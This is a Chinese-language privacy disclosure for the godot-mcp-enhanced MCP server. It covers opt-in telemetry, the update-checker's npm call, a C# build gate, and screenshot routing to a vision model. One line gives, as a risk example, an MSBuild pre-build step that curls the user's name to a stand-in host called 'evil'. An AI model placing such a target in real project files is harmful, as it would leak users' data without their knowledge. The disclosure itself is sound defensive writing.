# 匿名遥测（Anonymous Telemetry）

> **默认关闭 · opt-in · 阶段 0 零外传**。本文档如实披露遥测收集范围、红线、opt-in 方式，
> 以及**既有的非遥测外传点**（update-checker 启动查 npm registry）。

本页面适用于 `godot-mcp-enhanced` v0.25.0+（遥测骨架首次引入）。

---

## 设计原则

1. **默认关闭（opt-in）** — 不启用时零副作用：不读 UUID 文件、不调度、不分配队列。
2. **阶段 0 零外传** — collector endpoint 默认空字符串，即使开启遥测也**不发任何数据出进程**。阶段 1 接入收集服务后再定 endpoint。
3. **出进程前脱敏** — 源码 / 场景内容 / 文件路径 / 项目名永不离开本机。
4. **诚实披露** — 既有的非遥测外传点（update-checker）在本文档明确标注，不藏在代码里。

---

## 收集什么（仅当 `GODOT_MCP_TELEMETRY=true` 时）

每次 MCP 工具调用结束后，`ToolDispatcher` after-hook 记录一条事件，字段如下：

| 字段 | 类型 | 说明 |
|------|------|------|
| `tool` | string | 工具名（如 `execute_gdscript` / `add_node`），不含参数 |
| `success` | boolean | 调用是否成功（未抛错 / 未返回 `isError: true`） |
| `duration_ms` | number | 调用耗时（毫秒） |
| `error_category` | string? | 失败时附加：固定枚举 `TOOL_ERROR`（不采集 `Error.name`，原白名单脱敏方案已随 T1 删除），**绝不携带原始 `message`** |
| `project_hash` | string? | `sha256(installUUID + projectPath)` 前 8 hex。加盐防字典反推，**不可逆推原路径** |

附带的安装级元数据（每次批量 flush 时附在请求头/元数据，非每条事件重复）：

- **install UUID** — 一次性生成的 v4 UUID（见下「数据存哪」），用于在同一安装内关联事件，**不绑定用户/邮箱/IP/account**
- **version** — `package.json` version，经白名单正则校验（`^[A-Za-z0-9][A-Za-z0-9._+-]{0,63}$`），不合法 fallback `unknown`，防注入与路径泄漏

## 绝不收集（红线）

以下信息**永远不会**被遥测采集，无论 opt-in 与否：

- 源码、GDScript 片段、`.tscn` / `.tres` 场景内容
- 文件路径、绝对路径、项目名（slug 必先 hash 后才出进程）
- 编辑器日志、Godot 输出、`print()` 内容
- 邮箱、IP、账号、主机名、用户名
- Bridge secret、确认令牌、API key
- 工具调用的参数值（仅记录工具名 + 成功/失败 + 耗时）

---

## opt-in 方式

遥测**默认关闭**。三种状态：

| 场景 | 行为 |
|------|------|
| 默认（未设 env） | `isTelemetryEnabled()` 返回 `false`，record 立即 return，零开销 |
| `GODOT_MCP_TELEMETRY=true` | 启用；record 入队列，下个 tick 异步 flush（fire-and-forget，`setTimeout(...,0).unref()` 不保活 event loop） |
| `CI=true` | **强制关闭**（防 CI 触发合成事件污染统计），即使同时设了 `GODOT_MCP_TELEMETRY=true` 也忽略 |

### 阶段 0 边界（重要）

即便 opt-in 启用，**当前阶段 0 collector endpoint 默认为空字符串**：

```ts
// src/telemetry/collector.ts:8
const ENDPOINT = process.env.GODOT_MCP_TELEMETRY_ENDPOINT ?? '';  // 默认空=不发
```

endpoint 空 → record 检测到后立即 return，**不入队、不调度、零网络**。

要真正发送数据，需额外设 `GODOT_MCP_TELEMETRY_ENDPOINT=<URL>`。**当前仓库未配置任何默认 endpoint**，阶段 0 = 零外传是硬编码契约。阶段 1 接入收集服务（自建 / 第三方）后再定默认 endpoint，届时会同步更新本文档与 CHANGELOG。

---

## 数据存哪

### Install UUID

- **位置**：`~/.godot-mcp/telemetry-uuid.txt`（与 `update-checker.ts` / `instance-manager.ts` 共用 `~/.godot-mcp/` 父目录惯例，机器级，非项目级）
- **生成**：首次调用 `getInstallUUID()` 时 `crypto.randomUUID()` 生成 v4 UUID 并立即写回
- **权限**：POSIX `0o600`（owner-only read/write）；Windows 忽略 mode 参数，依赖文件系统默认 ACL
- **缓存**：进程内单例缓存（`_uuidCache`），同进程后续读不重复 IO
- **opt-out 不删文件**：`cleanupLocalFiles()` 仅清内存缓存，保留 UUID 文件以维持身份稳定性（重新 opt-in 后仍是同一 UUID）

### 队列与发送

> [!warning] Stage 0 stub（2026-08-06 审查 P2 修复订正）
> 当前实现处于 Stage 0：`sendBatch()` 是 stub（`src/telemetry/collector.ts:45-46` 空函数体），**永不调用**。即使设 `GODOT_MCP_TELEMETRY_ENDPOINT`，也不会发送任何数据。下列"发送"行为描述是 Stage 1 接入后的契约，当前仅为预埋设计。

- **队列**：进程内数组，上限 `QUEUE_MAXSIZE = 500`，满时丢新事件（保业务关键旧事件）
- **发送**（Stage 1 实现）：`setTimeout(flush, 0)` 异步 fire-and-forget，批量 POST 到 `GODOT_MCP_TELEMETRY_ENDPOINT`。Stage 1 实现须遵 `collector.ts:44` 注释预埋的安全契约：`trustEnv=false`（防 HTTP_PROXY 拦截重定向）+ `try/catch`（永不传播故障）
- **失败传播**：消费侧任何 throw 都被吞掉（`catch {}`），**绝不会让遥测故障影响 MCP 业务**
- **不持久化**：队列纯内存，进程退出丢弃（fire-and-forget 语义，daemon-less）

---

## ⚠️ 诚实披露：既有的非遥测外传点

遥测骨架（Task 1-4，commit 19a35ab）本身严格遵守「默认零外传」。但**本仓库历史上已存在一个独立的网络外传点**，与遥测无关但同样涉及「数据离开本机」，这里如实披露：

### update-checker（src/core/update-checker.ts）

每次 MCP server 启动时，`src/index.ts:125-133` 异步调用 `checkForUpdateCached()`：

```ts
// src/index.ts:124-133
// self-update: 异步查 npm 最新版，有更新 stderr 提示（失败静默，不阻塞 stdio 握手）
import('./core/update-checker.js')
  .then(({ checkForUpdateCached }) => checkForUpdateCached())
  .then(r => { /* 若有新版，stderr 提示 */ })
  .catch(() => { /* 网络失败静默 */ });
```

`checkForUpdateCached()` 的行为（`src/core/update-checker.ts`）：

- **请求目标**：`https://registry.npmjs.org/godot-mcp-enhanced/latest`（`:13` `REGISTRY_URL`）
- **触发时机**：每次 MCP server 启动（被动，非用户主动调用 `check_update` 工具）
- **网络请求**：`fetch(REGISTRY_URL, ...)`（`src/core/update-checker.ts`），5 秒超时
- **缓存**：24 小时 TTL，缓存文件 `~/.godot-mcp/update-cache.json`，缓存命中则不发网络请求
- **发送的数据**：仅 HTTPS GET 请求 npm registry（标准 npm registry GET，不附 body、不附 install UUID、不附任何自定义 header）。npm registry 服务端会记录请求 IP / UA（fetch 默认 User-Agent），这些由 npmjs.org 服务端策略控制，**本仓库不可控**
- **失败静默**：网络失败 / 超时 / 解析失败均 `catch {}` 吞掉，不影响 MCP 启动

### env 门控（2026-08-06 审查 P3 修复）

> 截至 v0.25.7+（2026-08-06 审查 P3 修复），**`update-checker.ts` 已支持 env 门控**：
> 设 `GODOT_MCP_UPDATE_CHECK=false` 即可关闭启动时的 npm registry 查询（对齐 telemetry opt-in 哲学）。
>
> - **默认行为（未设 env）**：启动时被动查 npm registry（24h 缓存兜底，首次必传一次）
> - **设 `GODOT_MCP_UPDATE_CHECK=false`**：完全跳过启动外传，`checkForUpdateCached` 直接返当前版本（不 fetch、不读缓存）。注：`self_update` 的 `check` action 不受此 env 门控——该 action 经 `force:true` 短路门控，且 risk='read' 不经确认令牌，**AI 可自主调用触发外传**（IP/UA 泄漏 npmjs.org）。严格零外传需防火墙、`NO_PROXY=registry.npmjs.org` 或 readOnly 模式拒整工具
>
> 此前状态（已修复）：v0.25.0~v0.25.6 期间无 env 门控，与「默认零外传」声明冲突。原 workaround（防火墙/预置缓存/代理）仍可用，但现已非必需。

### 代理环境变量遵守

> **代理环境**：update-checker 的 npm registry fetch 遵守 `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` 环境变量（Node 默认 `trustEnv`）。这意味着：(1) 企业代理环境下请求经代理；(2) 完全阻断可设 `NO_PROXY=registry.npmjs.org` 或防火墙规则。**刻意不设 `trustEnv: false`**——那会切断合法企业代理用户的更新检查。

---

## 相关代码

| 模块 | 路径 | 职责 |
|------|------|------|
| Config | `src/telemetry/config.ts` | opt-in 判定（CI 强制 false）+ install UUID 管理 |
| Sanitize | `src/telemetry/sanitize.ts` | `hashProject` / `sanitizeVersion`（T1 修复后 `error_category` 改固定枚举 `TOOL_ERROR`，原 `safeErrorCategory` 已删） |
| Collector | `src/telemetry/collector.ts` | fire-and-forget 队列 + flush，endpoint 空=零外传 |
| Index | `src/telemetry/index.ts` | re-export |
| Middleware 接入 | `src/core/dispatcher/ToolDispatcher*.ts` | after-hook：每次 tool 调用后 record |
| Feature flag | `src/core/feature-flags.ts` | `FEATURES.TELEMETRY`（env `GODOT_MCP_TELEMETRY`，default `false`） |

---

## 后续阶段（规划，非当前实现）

- **阶段 0（当前）**：骨架 + 默认关闭 + endpoint 空 = 零外传。仅本地积累队列（仅内存）。
- **阶段 1（未来 PR）**：接入收集服务（自建 PostHog / Plausible / 自托管），定默认 endpoint，补隐私 policy 链接。
- **阶段 2（未来 PR）**：聚合看板（工具使用频次 / 错误率 Top N / 版本分布），仅项目维护者可见。
- **update-checker env 门控（独立 PR）**：~~补 `GODOT_MCP_UPDATE_CHECK=false` opt-out，让默认零外传声明对所有外传点都成立。~~ ✅ **已落地**（2026-08-06 审查 P3 修复，见上「env 门控」段）

---

## 非 telemetry 外传点：C# dotnet build MSBuild Target（2026-08-06 审查 P2 披露）

> 此项**不属于 telemetry 子系统**，但属可控外传面，一并列出供用户知情。

`edit_script` 编辑 `.cs` 文件后会调 `dotnet build --no-restore` 做编译验证（`src/tools/script.ts:csharpValidateAndRevert`）。`--no-restore` 阻止 NuGet 包还原，但**不阻止** `.csproj` 内 MSBuild `<Target BeforeTargets="BeforeBuild">` 预构建步骤执行——后者可含 `<Exec Command="curl http://evil/$(UserName)"/>` 等网络请求，触发外传。

**控制方式**（2026-08-06 审查 P1 修复）：`csharpValidateAndRevert` 现要求 `GODOT_MCP_PRIVILEGED_GROUPS=code-execution` opt-in 才走 dotnet build；未 opt-in 时 skip（不阻断编辑，但也不跑 build）。这与 `execute_gdscript` 的 action-gate 哲学对齐——任意代码执行面须显式授权。

**用户的可控边界**：(1) 不设 `GODOT_MCP_PRIVILEGED_GROUPS=code-execution` 则 dotnet build 不跑（零外传风险）；(2) 设了 opt-in 后，外传面等同于手动运行 `dotnet build`（用户对自己项目的 .csproj 负责）。

阶段 1+ 均会同步更新本文档与 CHANGELOG，并通过 `setup_project_rules` 写入 `.claude/rules/` 让 AI 在使用本工具时知晓当前阶段。

---

## 非 telemetry 外传点：Vision Router（screenshot vision_route，2026-08-11 审查 P1 披露）

> 此项**不属于 telemetry 子系统**，但属可控外传面，一并列出供用户知情。2026-08-11 隐私审查第 6 轮发现 commit `6f068e8` 引入的 vision-router 此前未在本文档披露。

`screenshot` 工具的 `analyze` action 设 `vision_route=true` 时（`src/tools/screenshot.ts:217`），若同时设了 `GODOT_MCP_VISION_KEY`，会把截图路由到视觉模型翻译成文字描述（让纯文本模型也能"看"截图，对标 godot-ai vision_routing.gd）。

**外传内容**（`src/core/vision-router.ts`）：
- **截图数据**：PNG 先降采样至最长边 1024px 再外传（`data:image/...;base64,<截图 base64>`，`:149` `image_url` 字段）；JPEG 超 1MB 拒传并 fallback 本地 detail；<1MB JPEG 以原文外传（`src/tools/screenshot.ts:230` / `:237`）
- **prompt**：要求视觉模型"quote text exactly"（精确引用屏幕文字，含 UI 文本/错误消息/HUD 值/debug overlay）+ agent 上下文（`question` 参数，如"我在调试 Player 走路动画"）
- **endpoint**：默认 `https://api.groq.com/openai/v1/chat/completions`（`:52` `DEFAULT_BASE_URL`，OpenAI dialect 兼容）
- **模型**：`meta-llama/llama-4-scout-17b-16e-instruct`（groq 视觉模型，有免费档）

**双重 opt-in 门控（默认零外传）**：
1. **per-call** `vision_route=true`（显式传参，默认 false——不传则零外传）
2. **env** `GODOT_MCP_VISION_KEY`（视觉模型 API key，未设则 `routeImage` 返 `{success:false, error:'No API key'}`，调用方 fallback 到本地 detail 分层，零外传）

**用户的可控边界**：
- 不传 `vision_route=true` 或不设 `GODOT_MCP_VISION_KEY` → **零外传**（fallback 本地 detail 分层描述）
- 设了双重门控后，外传面等同于用户手动把截图发给 groq（用户对自己的 API key + 截图数据负责）
- **可覆盖 endpoint**：设 `GODOT_MCP_VISION_BASE_URL` 指向自建视觉模型 / 本地 ollama / 国内中转（OpenAI dialect 兼容即可），截图不外传到 groq

**与 update-checker 的对比**：update-checker 是启动时被动外传（IP/UA 到 npmjs.org）；vision-router 是 per-call 显式外传（截图数据——PNG 已降采样、超大 JPEG 拒传——到 groq）。两者都默认零外传（前者靠 env opt-out，后者靠双重 opt-in），但触发粒度 + 外传数据量级不同。
